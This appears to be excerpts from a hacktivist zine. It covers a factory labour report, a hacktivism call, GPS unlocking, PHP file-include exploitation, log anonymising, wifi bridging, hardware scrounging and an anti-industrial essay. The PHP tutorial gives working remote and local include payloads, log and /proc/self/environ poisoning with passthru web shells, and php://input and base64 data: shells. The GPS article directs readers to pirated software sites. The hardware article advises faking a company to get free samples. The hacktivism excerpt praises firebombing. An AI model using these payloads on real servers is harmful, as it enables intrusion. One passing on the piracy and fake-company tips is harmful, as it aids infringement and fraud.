The report is very \r\ncomprehensive and includes pictures from within the facility. Here is an \r\nexcerpt:\r\n\r\n* The workers are paid 1/50th of a cent for each operation.\r\n* The assembly line never stops, and workers needing to use the bathroom must \r\nlearn to hold it until there is a break.\r\n* All overtime is mandatory, with 12-hour shifts seven days a week and an \r\naverage of two days off a month.  A worker daring to take a Sunday off—which is \r\nsupposedly their weekly holiday—will be docked 2 % days' wages.  Including \r\nunpaid overtime, workers are at the factory up to 87 hours a week.  On average, \r\nthey are at the factory 81 hours a week, while toiling 74 hours, including 34 \r\nhours of overtime, which exceeds China's legal limit by 318 percent!\r\n* The workers are paid a base wage of 64 cents an hour, which does not even come \r\nclose to meeting subsistence level needs.  After deductions for primitive room \r\nand board, the workers' take-home wage drops to just 41 cents an hour.  A worker \r\ntoiling 75 hours a week will earn a take-home wage of $57.19, or 76 cents an \r\nhour including overtime and bonuses.  The workers are routinely cheated of 14 to \r\n19 percent of the wages legally due them.\r\n* Ten to twelve workers share each crowded dorm room, sleeping on narrow metal \r\nbunk beds that line the walls.  They drape old sheets over their cubicle \r\nopenings for privacy.  In the winter, workers have to walk down several flights \r\nof stairs to fetch hot water in a small plastic bucket, which they carry back to \r\ntheir rooms to take a sponge bath.  In the summer, dorm temperatures reach into \r\nthe high 90s.\r\n* Workers are locked in the factory compound four days a week and are prohibited \r\nfrom even taking a walk.\r\n* To symbolize their \"improving lives\" the workers are served a special treat on \r\nFridays—a small chicken leg and foot.  For breakfast, they are given watery rice \r\ngruel.  The workers say the food has a bad taste and is \"hard to swallow.\"\r\n* Illegally, workers are not inscribed in the mandatory work injury and health \r\ninsurance and Social Security maternity leave program.  In the Molding \r\ndepartment, due to the excessive heat, the workers suffer skin rashes on their \r\nfaces and arms.\r\n* One worker summed up the general feeling in the factory:  \"I feel like I am \r\nserving a prison sentence.\"\r\n\r\nRead the Full Report:   http://www.nlcnet.org/article.php?id=613\r\n\r\nhttp://www.nlcnet.org/admin/media/images/China/2009%20meitai%20factory/images/\r\nworkers%20inserting%20keys.jpg\r\n[caption: chinese sweatshop producing keyboards for american corporations]\r\n\r\nhttp://www.nlcnet.org/admin/media/images/China/2009%20meitai%20factory/images/\r\nlunch%20line%20from%20back.jpg\r\n[picture: workers in uniform line up for watery rice gruel breakfast]\r\n\r\nCorporate Contact Information:\r\n\r\nLenovo / U.S. Office\r\n1009 Think Place / Morrisville, North Carolina 27560    /  Phone: 866-968-4465        \r\nPresident and CEO: Mr. William J.

Here is an \r\nexcerpt from their communique:\r\n\r\n  \"Hackers Against Oppression have called for Electronic Civil Disobedience in \r\n  Solidarity with Greek Anarchists on Wednesday Dec 31, the final day of \r\n  December. December is the month in which Alexandros Grigoropoulos, a\r\n  15-year-old Anarchist, was murdered in cold blood by Greek Police. It is also\r\n  the month that will forever be remembered by all those who struggle. Minutes\r\n  after his murder, thousands of Greek residents took to the streets as did\r\n  thousands around the world. Even liberal groups have called for the\r\n  resignation of the Greek government. The streets were taken back for the\r\n  people, police buildings were firebombed, and banks were turned into empty\r\n  charred-out boxes. This entire time, the Greek government has been fighting\r\n  and oppressing people with guns, tear gas, and the media.

Hacking your GPS Personal Navigation Assistant                by KuroiShi #\r\n################################################################################\r\n\r\nDISCLAIMER: You can permanently break your GPS by doing this.   I haven't yet, \r\nbut I'm sure it's possible.   I've heard of people bricking their GPS unit just \r\nby running 3rd party WinCE software on it.   Don't say you were not warned.\r\n\r\nI recently got a PNA unit for my Chicago alley mapping project and learned some \r\nuseful things about inexpensive touch screen devices on the market today.   \r\nFirst off, most devices sold today are just locked down WinCE devices with low \r\nmemory, no keyboard, GPS chipset and touchscreen.   Many include SD cards and \r\nUSB interfaces and are easy to hack and install third party software on.   GPS \r\nhardware is cheap, and when you buy an expensive unit, your paying for the fancy \r\nnavigation software and map updates it comes with.   Many of the expensive units \r\nrun on the same hardware as ones you can pick up for $60-$80 bucks on sale.\r\nI did all my work on the Holux GPSMile 52+, running WinCE 5.0.   From what I've \r\ngathered, it seems most PNA's these days run on the same or similar hardware.   \r\nMine uses a Samsung S3C2440A 400mhz ARM processor, with the SirfStar III GPS \r\nchipset, 32Mb NAND flash + 64Mb SDRAM internally, plus an SD slot for mapping \r\nsoftware.   It has a 3.5\" (320x240 resolution) screen, which is important, \r\nbecause some of the software I run is made for 480x272, and you need to modify \r\nit so it fits on your screen.   GPS units similar to mine that might find this \r\nguide useful are:\r\n\r\nMio c310x, c320, c520, c710, c220, c620 and c720.\r\nMagellan devices\r\nNavigon devices\r\nPretty much anything with SirfStarIII, an ARM processor and Windows CE 4. or 5.0\r\nAs always, your mileage may vary.\r\n\r\nDevices that WON'T unlock this way are:\r\nTomTom devices\r\nGarmin devices\r\n(Both of these devices run a version of linux, and while i'd love to hack around \r\nwith one of them, I don't have one!)\r\n\r\nMy GPS comes with a shitty little shell that launches on boot from the internal \r\nflash memory, it's called setup.exe, and I don't fuck with it because I think it \r\nlaunches some critical functions on boot.   If the SD card is inserted in the \r\nslot, it autoruns the GPS navigation software, called \"Holuxnavi.exe\", and if no \r\nSD card is present you just sit in the shell where you can select GPS, Pictures, \r\nMusic, or change some rudimentary options.   It's easy enough to break out of \r\nthis by naming whatever you want to run on boot to Holuxnavi.exe (or your \r\nrespective auto-launching exe, for your device)   This brings us to;\r\n\r\nBreaking out of your shell and into WindowsCE.\r\n\r\nNow, I'm not sure why you'd want to use Windows CE over a functional and much \r\nprettier shell, but it does let you run software other than what your unit came \r\nwith so lets get to it. You'll probably first want to replace your Holuxnavi.exe \r\n(or C310Auto.exe or whatever your GPS device starts at boot time, shouldn't be \r\ntoo difficult to find) with a basic winCE shell called \"ceDesktop.exe\"   this \r\nwill let you explore the files on your device and get a feel for things.   You \r\ncan get ceDesktop and many other useful tools for this tutorial on \r\ngpspassion.com, gpsunderground.com and ppcwarez.org.   (these are forums, most \r\nof the software is hosted on rapidshare.com and similar sites.)   Now once you \r\nrename ceDesktop to replace your navigation software we can explore around a \r\nbit, see what minimal DLLs are required to run your device unmodded, etc.   Now \r\nwould probably be a good time to backup your unit using Microsoft ActiveSync.   \r\nI also recommend putting the SD card that comes with the unit in a safe place, \r\nand making a new one from the CD or SD card that came with your unit.   Now we \r\nshould have access to the CE filesystem and a few basic things (like Control \r\nPanel)   Now we get to add some fun software.\r\n\r\nMaking your PNA environment more useful.\r\n\r\nNow you have ceDesktop.exe running on boot, but theres still nothing but control \r\npanel and some shitty navigation software with maps from 2001.   I used some of \r\nthe tools provided with the C310Auto.zip Mio C310 unlock package on \r\nGPSPassion.com to add some basic tools and get a regular desktop.   If you use \r\nthis script you'll probably want to change the C310Auto.c31 script around, it \r\nmakes some minor registry edits and copies some software to your internal \r\nmemory.   Also, you need to change the .c31 file to reflect the name of your \r\nexecutable, (I.E. I rename my C310Auto.exe and .c31 to Holuxnavi.exe and \r\nHoluxnavi.c31 respectively, then I add a line in the .c31 script file to run \r\nceDesktop after it does it's thing.)\r\n\r\nC310Auto comes with some other stuff too, in the \\SDMMC\\Programs\\Utils directory \r\nyou'll find some useful tools for adding more software to your PNA.   It has a \r\ntaskmanager (which I use to kill start.exe to drop to the CE desktop)   a \r\nRegistry editor, On screen keyboard, a more fully featured filemanager than \r\nceDesktop, and some status monitoring tools.   Surf around and find some more \r\nuseful PocketPC apps to run and set up your environment any way you please.   \r\nOne thing you might want to do is make sure you do everything on the SD card and \r\nleave the internal memory on your unit alone as much as possible.   Another \r\nuseful hint is to use Dependency Walker on a windows machine to open up your CE \r\nexecutables and check for DLL dependencies.   It's a pain in the ass in this \r\nminimal environment to get software running.\r\n\r\nInstalling 3rd party navigation software.\r\n\r\nMy unit came with Smart2Go which is some REALLY REALLY basic (read shitty) \r\nnavigation software.   I never really tried using it for navigation, I've read \r\nabout it telling people to take random turns off the street into buildings, \r\nrandom dangerous U-turns and just generally bad navigation and getting you lost.   \r\nPlus the maps were so out of date that roads have been moved since it came out.   \r\nI downloaded iGo 2008 off of Pirate Bay and used that to replace my navigation \r\nsoftware.   Once again I had headaches finding all the DLLs I needed to make the \r\ninstaller run.   Dependency Walker was again, a life saver.   Some other popular \r\nsoftware people run for navigation is MioMap, Finean, Destinator, PolNav, \r\nRoute66, TomTom (Older versions, pre linux), Garmin (Same as TomTom, need to run \r\nolder version)   I suggest you just try them out.   A good place to find this \r\nstuff is ppcwarez.org, gpsunderground.com, and thepiratebay.org.   \r\nGPSPassion.com is an excellent resource for figuring out how to configure your \r\nunit, but they have taken a decidedly negative stance towards running pirated \r\nsoftware on your GPS unit.   Also, if you find your unit crashing a lot during \r\nlarge file transfers and software installs, try turning up your virtual memory \r\nsettings in the control panel.\r\n\r\nInstalling PDA software on your PNA.\r\n\r\nNow hopefully everything has gone well and you have unlocked your WinCE, and \r\ninstalled some useful navigation software and some system tools.   Now what \r\nabout playing DOOM and having contacts stored and a tip calculator and all that \r\nfun stuff?   I can't really recommend this software without saying first that \r\nI've read on forums of people using applications like this and it throwing off \r\nthe touchscreen calibration to the point where the device is useless.   Again \r\nI'll repeat \"THIS CAN BRICK YOUR GPS DEVICE AND MAKE IT USELESS!\"   The problems \r\nI have heard were with the GAPI graphics library crashing and then the \r\ntouchscreen never works again.   I haven't had any problems, but you can't say I \r\ndidn't warn you.     MioPocket is a suite of free software distributed online \r\nthat turns your PNA into a PDA.   It was written for the Mio PNA's, but it runs \r\nfine on my Holux unit.   It has some useful shareware navigation software such \r\nas BeeLineGPS that I like for geocaching and for mapping my tracks in google \r\nmaps. (For my aforementioned Chicago Alley Mapping Project)   MioPocket also has \r\na bunch of shareware/freeware PDA software such as Microsoft Office document \r\nviewers, calculators, games, etc. etc.   It has a few skins, all pretty, if you \r\nthink Vista is pretty.   MioPocket runs at 480x272 by default, so if you have a \r\nsmaller unit like mine, you'll need to choose one of the 320x240 skins.   While \r\nit's pretty and fun to fuck around with, I don't trust MioPocket one bit, and \r\nonly run it occasionally.   I built my own interface using some of the tools \r\nfrom the C310Auto package, some of the tools from MioPocket, and running a copy \r\nof iGo 8, It seems to run way more stable than MioPocket, and I don't have to \r\nworry about accidentally bricking my GPS with a crash.   MioPocket is hosted on \r\nRapidshare, you can get a link to the latest version on the GPSPassion.com \r\nforums.\r\n\r\nUseful resources.\r\n\r\nI thought I'd just give you a run down of the resources I found most useful in \r\nhacking my GPS device.\r\n\r\nGPSPassion.com - The most useful resource, GPS Enthusiasts from all over the \r\nworld post useful information here.   They don't like discussion about running \r\nillegal software on your PNA.\r\n\r\ngpsunderground.com - This site mostly just references to GPSPassion, but theres \r\nstill some good info here, plus they aren't strict about talking about running \r\npirated software.\r\n\r\nppcwarez.org - Links to pirated PocketPC software.

Alternative PHP Include Vulnerability Techniques             by Anonymous #\r\n################################################################################\r\n\r\nOne of the fundamental mistakes made by PHP developers is to improperly sanitize \r\nvariables before being passed to system functions - particularly include() and \r\nrequire(). This common mistake leads to what is known as Remote File Include and \r\nLocal File Include type vulnerabilities. In the past few years PHP itself has \r\nstarted to ship with default configuration settings to try to neutralize or \r\nlimit the effects of such vulnerabilities. But even with simple local file \r\nincludes, there are newer techniques to exploit these vulnerabilities that lead \r\nto remote command execution.\r\n\r\nIntroduction to PHP include vulnerabilities\r\n--------\r\nThe point of file include type vulnerabilities is to figure out a way to include \r\na file with your malicious PHP code in it. \r\n\r\n<?php   include($_GET['content']);   ?>\r\nhttp://asdf/index.php?content=/etc/passwd\r\nhttp://asdf/index.php?content=http://malicious.com/exec.php\r\n\r\nThe first example will include the local file /etc/passwd. The second example \r\nwill attempt to retrieve exec.php from malicious.com. This remote include is \r\nturned off by the default allow_url_fopen PHP setting in most situations.\r\n\r\nThe vulnerable PHP code might be a little more restrictive than the above \r\nexample. By prepending the include with a directory they prevent remote file \r\nincludes(http://) and by appending a file extension they can attempt to restrict \r\nwhich types of files can be included. \r\n\r\n<?php include(\"pages/\" . $_GET['content'] . \".php\"); ?>\r\nhttp://asdf/index.php?content=../../../etc/passwd%00\r\n\r\nThe use of ../ allow directory transversal style manipulations and lets you \r\nnavigate outside of the prepended directory in the code. If the PHP setting \r\nopen_basedir is on, it will prevent you from navigating around too much. The web \r\ndeveloper might also use some sort of sanitation function to strip malicious \r\ncharacters out of user input, but this is not always the case.\r\n\r\nThe null byte character (%00 \\0) terminates the string and cuts off whatever \r\ncomes after it, but this is also escaped when magic_quotes_gpc is turned \r\non(default). There are techniques published in the paper \"PHP filesystem attack \r\nvectors\" at http://ush.it that provide possible ways to get around sanitation of \r\nnull byte characters.\r\n\r\nThe PHP script may also depend on such variables as $_GLOBAL[] or $_SERVER[] \r\nsuch as the recently discovered phplist vulnerability (patched in 2.10.9): \r\nhttp://asdf/phplist/admin/?_SERVER[ConfigFile]=/etc/passwd\r\n\r\nLocal File Include to Remote Code Execution\r\n----\r\nOnce you find a local file include vulnerability, you need to find a way to \r\ninsert your malicious PHP code into a file on the server. A number of techniques \r\nhave appeared over the past few years:\r\n\r\nOne technique is to inject PHP code in server logs to be later included via the \r\nabove include vulnerabilities. It is possible to make a HTTP request inserting \r\nour code into the headers and then including apache's access_log (It may take \r\nsome experimentation to find the correct directory for access_log). Consider the \r\nfollowing example which works on a Mac OS X default apache/php configuration \r\n(writing scripts to send requests may be necessary because the browser will \r\nescape certain characters) :\r\n\r\n<?php  \r\n$a = fsockopen(\"localhost\", 80);\r\nfwrite($a, \r\n\"GET /<?php passthru(\\$_GET['cmd']); ?> HTTP/1.1\\r\\n\" . \r\n\"Host: localhost\\r\\n\" . \r\n\"Connection: Close\\r\\n\\r\\n\" );\r\nfclose($a);\r\n?>\r\n\r\nhttp://localhost/index.php?content=/var/log/httpd/access_log&cmd=id\r\n\r\nAnother method is including /proc/self/environ which contains the environment \r\nvariables for the  apache/php process. If we were to insert malicious code into \r\nthe User-Agent header, this code appears in that file, and so remote command \r\nexecution is possible (provided /proc/self/environ is readable by the web \r\nserver).\r\n\r\n<?php  \r\n$a = fsockopen(\"localhost\", 80);\r\nfwrite($a, \r\n\"GET /../../../../proc/self/environ HTTP/1.1\\r\\n\" . \r\n\"User-Agent: <?php passthru(\\$_GET['cmd']); ?> \\r\\n\" . \r\n\"Host: localhost\\r\\n\" . \r\n\"Connection: Close\\r\\n\\r\\n\" );\r\nfclose($a);\r\n?>\r\n\r\nPHP wrapper include vulnerabilities\r\n--------\r\nAnother way of exploiting PHP include functions are utilizing php:// wrappers \r\n(http://www.php.net/wrappers.php). This example will utilize php://input which \r\ntakes raw data from an HTTP POST request and executes it:\r\n\r\nVulnerable code:\r\n<?php include($_GET['content']); ?>\r\n\r\nOur request: \r\n<?php\r\n$request = \"<?php passthru('id;');?> \";\r\n$req = \"POST /index.php?content=php://input HTTP/1.1\\r\\n\" .\r\n\"Host: localhost\\r\\n\" .\r\n\"Content-type: text/html\\r\\n\" .\r\n\"Content-length: \" . strlen($request) . \"\\r\\n\" .\r\n\"Connection: Close\\r\\n\\r\\n\" .\r\n\"$request \\r\\n\\r\\n\";\r\n$a = fsockopen(\"10.0.2.2\", 80);\r\nfwrite($a, $req);\r\necho $req;\r\nwhile (!feof($a)) {  echo fgets($a, 128);  }\r\nfclose($a); ?>\r\n\r\nOutput: uid=33(www-data) gid=33(www-data) groups=33(www-data)\r\n\r\nThis sample requires both allow_url_include and allow_fopen_include to be on, in \r\nwhich case the standard remote file inclusion (http://malicious/exec.txt) is \r\npossible. The advantage of this method is that it does not depend on storing \r\nfiles on external servers. cr0w-at.blogspot.com mentions another technique using \r\nthe \"data:\" wrapper:\r\n\r\nindex.php?content=data:,<?php system($_GET[c]); ?>?&c=dir\r\n   Or with base64 encryption (possibly bypassing validation/sketchy logs): \r\nindex.php?content=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=dir\r\n\r\nConclusion\r\n----\r\nMost of these methods are nothing new and do not demonstrate flaws or \r\nlimitations in the PHP language itself. These problems can typically be \r\nprevented by strong input validation, common sense coding, and some tighter \r\nserver configurations. However it does not seem likely that many of these types \r\nof problems(among others, such as SQL injection) will be going away anytime \r\nsoon. So Happy Hacking!\r\n\r\n\r\n################################################################################\r\n# 5. Hiding from the man: Apache IP Obfuscation                    by Flatline #\r\n################################################################################\r\n\r\nRecently I was considering the problem of keeping logs, obviously there are many \r\nreasons to keep apache logs on your server such as keeping stats, seeing who has \r\nbeen attack your website, and so on.  The problem with logs is that they can be \r\na privacy hazard for your users if your server were to be seized, the police \r\nwould be able to figure out who had been visiting your site.  I decided to come \r\nup with a solution to alleviate some of the privacy concerns, while still \r\nretaining the uniqueness of an ip address through a session so that useful \r\nwebstats could still be gained.  What I came up with was the following script.\r\n\r\nThis script takes an ip adress and turns it into another ip address using a \r\nsimple algorithm and the md5 hash.  This makes it so the ip addresses in your \r\nlogs are not the users real ip addresses yet you will still be able to track the \r\npath a user takes through your site, since ip addresses will \r\nremain the same.\r\n\r\nThis script is not perfect of course, the main problem being that it is  \r\nextremely vulnerable to a rainbow tables style attack.  The possible keyspace \r\nfor IP's is only 255^4 leaving about 4 228 250 625 possibilities for ip's.  An \r\nattacker with enough time on their hands could quickly create a rainbow table \r\nfor this script.  The problem would of course be alleviated by using ipv6 which \r\nhas a keyspace of 3.4 * 10^38 ip addresses, making it nearly impossible for a \r\nrainbow tables style attack to work.  (Though by the time anyone adopts ipv6 \r\ncomputing power will probably have significantly increased.)\r\n\r\nRight now this script is only in a proof of concept stage, it lacks many \r\nfundamental features like error checking and the ability to parse log files, but \r\nif it works out I plan to make a full apache module for it.\r\n\r\n#!/usr/bin/python\r\n\"\"\"\r\nanonIP  -  Anonymize ip addresses in your logs while still mantaining ip address \r\nintegrity\r\nAuthor - flatline <flatline@hackbloc.org>\r\nCopyright - GPLv3\r\nVersion = 0.1 (2009-03-14)\r\n\r\n\"\"\"\r\n# This code was found on http://code.activestate.com/recipes/66517/\r\n# The author is  Alex Martelli\r\nimport socket, struct, sys, md5\r\ndef dottedQuadToNum(ip):\r\n  #turns an Ip address into a number, duh!\r\n  \"convert decimal dotted quad string to long integer\"\r\n  return struct.unpack('!L',socket.inet_aton(ip))[0]\r\n\r\ndef numToDottedQuad(n):\r\n  \"convert long int to dotted quad string\"\r\n  return socket.inet_ntoa(struct.pack('!L',n))\r\n# Now starts my code\r\n\r\ndef ip2anonymous(ip):\r\n  long = dottedQuadToNum(ip)\r\n  m = md5.new(str(long)).hexdigest()\r\n  newLong = int(m,16) % 4294967295 #This modulo is because socket.inet_aton \r\n  chokes on an int > 4294967295\r\n  newip = numToDottedQuad(newLong)\r\n  return newip\r\n\r\nprint ip2anonymous(sys.argv[1])\r\n\r\n\r\n################################################################################\r\n# 6. Sucking Signal                                                   by Sally #\r\n################################################################################\r\n\r\nRecently I had to set up a wifi network that is open to guest and volun¬teers at \r\nwhere I work and live. However, it needed to be set up outside the range that \r\nthe omni antenna was already broadcasting. So what I did was purchase a \r\ndirectional antenna to \"suck\" the signal from the omni antenna and bring it \r\nthrough a bridged router and out through a regular router to the guest and \r\nvolunteers further up the property. With the help of a couple of IT consultants \r\nand a Linksys router with DD-WRT firmware, this was made possible and I'll tell \r\nyou how. \r\n\r\nEQUIPMENT \r\n•2.4 GHz 24 dBi High Performance Die Cast Reflector Grid Wireless LAN Antenna \r\n(Directional Antenna)\r\n•HyperAmp® AP 1 Watt 2.4 GHz 802.11g (b/g) Compatible Outdoor Bi- Directional \r\nWiFi Amplifier with Active Power Control \r\n•N-Male to N-Male: 400-Series Cable 30 feet \r\n•N-Female to N-Female Bulkhead 0-6 GHz Lightning Surge Protector \r\n•N-Male to N-Male: 400-Series Cable 25 feet \r\n•N-Male to Reverse Polarity TNC Plug: 400-Series Cable 2 feet \r\n•2 Linksys WRT54GL v 1.1 routers – one acting as a bridge and the other acting \r\nas an AP.\r\nNote: You don't have to use the equipment I used. There's cheaper stuff out \r\nthere. \r\n\r\nSET UP \r\nSo, with the help of a co-worker and friend, we got the directional antenna on \r\nthe roof mounted next to a fan, but far enough so the fan did not mess with \r\nreception. We then connected the amp to the antenna just a foot under the \r\nantenna on the same pole. Then we took the 30 foot n-male to n-male 400 series \r\ncable and connected it to the lightning protector. We put the lightning \r\nprotector in a weather proof box and attached it to the roof. A 20 foot cooper \r\nwire was connected to the top of the lightning protector and then run down to \r\nthe ground where it was attached to a ground stake and pounded into the ground \r\n(we have a lot of rain and thunder here, so that was needed). The 25 foot n-male \r\nto n-male cable was connected to other end of the lightning protector and run to \r\nthe power injector (which comes with the amp) and is located indoors next to the \r\nrouters. The n-male to tnc 2 foot cable was run from the power injector to the \r\nLinksys router that we used as a bridge.  It went where one of the short rubber \r\nduck antennas was located. The other Linksys WRT54G router became an Access \r\nPoint (AP) and was connected to the bridge via a cat 5e cable.  One end of a cat \r\n5e cable was connected to the internet (WAN) port of the AP and the other end \r\nwas connected to port 1 of the bridge.\r\n\r\n\r\nFLASH FIRMWARE \r\n\r\nThe following explains how to wipe the Linksys firmware on a router and replace \r\nit with DD-WRT.  For this article, you only have to flash the firmware for the \r\nrouter that will be the bridge because the Linksys firmware does not have bridge \r\ncapabilities.\r\n\r\nNote 1: If not followed properly, your router can be bricked. Linksys won't \r\nprovide support when you install 3rd party firmware. We are not responsible for \r\na bricked router. Do this at your own risk. \r\n\r\nNote 2: Do this over a wired connection. \r\n\r\nNote 3: Backup the router's CFE before flashing the firmware \r\n(http://www.dd-wrt.com/wiki/index.php/CFE_backup).  That way you can replace \r\nyour CFE should a brick occur.\r\n\r\n1.\tHard Reset: 30-30-30\r\n\ta.\tPlug in the router.\r\n\tb.\tPush in the reset button with a pen.\r\n\tc.\tHold it for 30 seconds.\r\n\td.\tDon't let go and pull the power cord out for 30 seconds.\r\n\te.\tPut the power cord back in for 30 seconds.\r\n2.\tWait. \r\n3.\tFlash firmware. \r\n\ta.\tOpen a browser and go to 192.168.1.1.\r\n\tb.\tUser=Admin and Password=Admin.\r\n\tc.\tGo to the Administration tab. \r\n\td.\tThen go to Firmware Upgrade subtab.\r\n\te.\tGo here to find the proper firmware for the router you are using.\r\n\t\thttp://www.dd-wrt.com/wiki/index.php/Supported_Devices#Linksys_.\r\n\t\t28all_the_rest_that_is_not_re-engineered_til_today.29\r\n\t\t\t1.\tThe last column tells you what to use.\r\n\tf.\tUse the latest build.  ftp://dd-wrt.com/others/eko/V24_TNG/svn11296/\r\n\t\ti.\tVersion 24 service pack 2 svn11296 seems the most stable.\r\n\t\tii.\tFor this article we downloaded dd-wrt.v24-11296_NEWD_mini.bin\r\n\tg.\tBrowse to the location you downloaded the firmware.\r\n\t\ti.\tClick upgrade. \r\n4.\tWait.5 minutes. \r\n\ta.\tLights should return to normal.\r\n\tb.\tFailing to wait is how most people brick their routers. \r\n5.\tDo a power cycle of the router. \r\n\ta.\tUnplug the power cord, count to 30 and plug it back in.\r\n6.\tWait for the lights to return to normal, usually about 2 minutes. \r\n7.\tHARD reset again (see #1 above).\r\n\ta.\tWait. \r\n\tb.\tCheck for the password page and re-login to change the password. \r\n\tc.\tThen you can reconfigure your settings manually.\r\n\r\nThings not to do!\r\n1.\tDon't install old config files on newer firmware upgrades.\r\n2.\tDon't unplug or reset while firmware is upgrading.\r\n3.\tDon't use v24 sp1.\r\n\r\nWhich version of firmware to use:\r\nThe final version of 24 (currently SP2):  SVN11296 seems very stable.\r\n1.\tWRT54G v2 vintage (vint) firmware.\r\n2.\tWRT54G v5 newd micro.\r\n3.\tWRT54G v8 v24 micro\r\n4.\tWRT54GL newd mini when first flashing, then newd std.\r\n\r\nTroubleshooting \r\n•\tOn a WinXP OS use IE explorer instead of Firefox or clear the cache on \r\nFirefox if it seems that changes aren't saving. \r\n•\tUse http not https when browsing to the IP addresses. \r\n\r\nCREATE BRIDGE \r\nI went to DD-WRT wiki and found out how to create a bridge using the DD-WRT \r\nfirmware on the Linksys router \r\n(http://www.dd-wrt.com/wiki/index.php/Wireless_Bridge).

Hardware Hacking                                                by Frenzy #\r\n################################################################################\r\n\r\nHardware hacking, another tool in the tool box, but essential for those of us \r\nwho want to learn the system. Hardware hacking and circuit building can be very \r\nrewarding with not much effort. With a resent surge in interest in \"hobby \r\nelectronics\" there are LOTS of resources out there. There are also people trying \r\nto make a buck, and looking to make you spend more than you need to. This \r\narticle seeks to display some of the ways I have found to get parts for free or \r\ncheap!\r\n\r\nThe first thing a hardware hacker needs is tools starting with a good soldering \r\niron. For this, it's best to get one that is a of good quality and a fine tip. A \r\nfat tip will just get in the way. My first soldering iron was a radio shack one, \r\nit worked, but once I upgraded to a xytronics one, my life got easier. You can \r\npick up either a weller or xytronics iron, the xytronics ones are cheaper, a \r\ngood one is under 30 bucks. The best way I have found to get this is on line. Do \r\nsome research. Along with an iron you'll need a multimeter, wire strippers, wire \r\ncutters and a lead cutter to trim components. Some way to remove solder helps as \r\nwell, like a \"solder sucker\" or de-soldering wick. Once you have your tools \r\ntogether it's time to go dumpster diving.\r\n\r\nDumpster diving is a good way to find lots of various components. I have found \r\nenough random capacitors and LEDs on spare circuit boards do projects without \r\nspending a dime. Removing parts from old circuit boards is also a good way to \r\npractice soldering. I dumpster behind the local radio shack and trolled around \r\nthe local college campus. Bring a screwdriver with you so you can open things on \r\nthe road and leave behind the cases taking with you the precious goodies! I use \r\nalmost everything from the wire, to speakers and resistors. If you are good with \r\na heat gun, you can use that to do your de-soldering and have all the parts fall \r\nright out!\r\n\r\nThe next way to get cheap parts is Ebay. Once you know what you need, go on Ebay \r\nand search for it. A lot of the sellers are direct from china (you get the parts \r\nfrom china anyway you might as well get them direct), so they are a lot cheaper, \r\nand sellers like to throw in goodies. I ordered 100 LEDs and got 100 resistors \r\nfor free.\r\n\r\nRequesting samples can work with a few companies. I have successfully requested \r\nsamples from Texas Instruments and Pactec enclosures. The key to getting samples \r\nis how believable you are. Make up a fake company, and try it out. It's nice to \r\nget free things sent to your door. I'm sure if you were really advanced, you \r\ncould never by parts again. For more about this go to \r\nhttp://www.ladyada.net/library/procure/index.html.\r\n\r\nLastly, ask your friends. You may have friends who tried out the hardware \r\nhacking thing and it wasn't for them. Parts have not changed much in the past 20 \r\nyears, so many will still work. If you have lots of friends into hardware, you \r\ncan go to a large distributor like DigiKey and get an order of parts.\r\n\r\nHAPPY HARDWARE HACKING!\r\n\r\nHere are a list of resources for those getting into hardware hacking:\r\nMake: Magazine: www.makezine.com\r\nLadyada: http://www.ladyada.net/\r\nInstructables: www.instructables.com\r\n\r\n\r\n################################################################################\r\n# 8. On Using Technology to Dismantle the Industrial Beast        by Anonymous #\r\n################################################################################\r\n\r\nOur civilization is so flooded with technology that it is difficult to imagine a \r\nworld without it. We have machines to wake us up and make us coffee in the \r\nmorning, machines to keep us informed and entertained, and machines to clean and \r\ndry our clothes. Many people who work exclusively with computers and technology \r\ncannot accomplish these simple tasks without the use of machines.\r\n\r\nYet human beings on this planet have been able to survive in harmony for \r\nhundreds of thousands of years without many of these 'modern advances'. The \r\nmajority of these domestications have only happened in the past few hundred \r\nyears with the Industrial Revolution. Now, not by coincidence, we are facing our \r\nlargest problems ever: with the resources and space available, will we really be \r\nable to sustain this great Industrial Beast we've built without killing \r\nourselves? And if we can, would it really be worth it?\r\n\r\nThe arguments for technology and industrialism usually suggest that these \r\n\"advances\" make life easier, work more efficient, and more enjoyable. As far as \r\nsurvival is concerned, we only really need a few basic needs, which in our \r\nnatural environment are relatively easy to procure as hunter / gatherers. Now \r\nthis is only possible in areas outside of cities where the land is not \"owned' \r\nand the food is not under lock and key. In these places, it becomes necessary to \r\nparticipate in the Economy by working at one of their jobs, the majority of \r\nwhich are not productive for survival purposes, but are artificially necessary \r\nto support the Industrial Beast. This ends up creating more work than is \r\nactually necessary for our survival, all for the Corporate Executives and \r\nStockholders who profit from our labor. Additionally, our reliance on technology \r\ncan make it difficult for some to prepare food, make or repair clothing, or even \r\nkeep entertained and stimulated without the aid of technology. \r\n\r\nTechnology and Industrialism are not necessary for our survival, and in fact, \r\nare being used against humanity and the planet as a whole by those who are \r\ncurrently in control of it: the Rich Ruling Classes.\r\n\r\nAt one point it was possible to disappear easily and live Off The Grid. Now, \r\nwith the help of modern technological advances, the ruling classes' dream can be \r\nfully realized: a world where everyone is given numbers and are carefully \r\ntracked, monitored, regimented. Virtually every aspect of our lives are now \r\nunder surveillance through integrated camera systems, GPS locating devices, RFID \r\ntags, social security numbers & bank accounts, phone / email taps, and even \r\nurine tests. On suspicion of wrongdoing, they can detain us and deny us our \r\nrights, calling us terrorists. Yet every day we are the ones who are Terrorized \r\nby their Technological Police State, exceeding Orwell's wildest nightmares.\r\n\r\nTechnology is also being used to keep us passive, domesticated, and brainwashed \r\nby the machine's propaganda. A few corporations control most of the television \r\nstations, radio stations, newspapers and other media. They use their monopoly of \r\nthe media to broadcast the positions of the State, favorable to Corporate and \r\nGovernment interests. They keep us passive and sedated with mindless \r\nentertainment, video games, reality TV shows, making us confused, distracted, \r\nnumb, and 'comfortable'. Now much of our communication with other human beings \r\nhas been reduced to instant messages and blogs. We have become their zombies who \r\ncannot think or accomplish this for ourselves or survive on our own, to a point \r\nwhere we depend on the Industrial Beast and cannot live without it - just where \r\nthey want us.\r\n\r\nIn addition to keeping us in slavery, the Machine has also held captive and is \r\nendangering the planet's stability. There is not much land and space that has \r\nnot been encroached by the Industrial Beast. Entire species have either been \r\nwiped out, domesticated, or controlled for food. Humans are the only species \r\nthat believes the entire planet belongs to it, and can be terraformed for \r\nhumanity. It does not take much research to see how badly we have damages the \r\nearth's natural balance, covering the earth with parking lots, power plants, \r\nStarbucks and concrete jungles. Exhausting the earth's natural resources, \r\nclimate instability, endangered species, even the air's breatheability and the \r\nwater's drinkability, all of which are a direct result of the Industrial Beast \r\nand the expansion of Capitalism.\r\n\r\nIn summary, the madness of the machine as controlled by the Rich Ruling Classes \r\nis keeping us in chains. All this 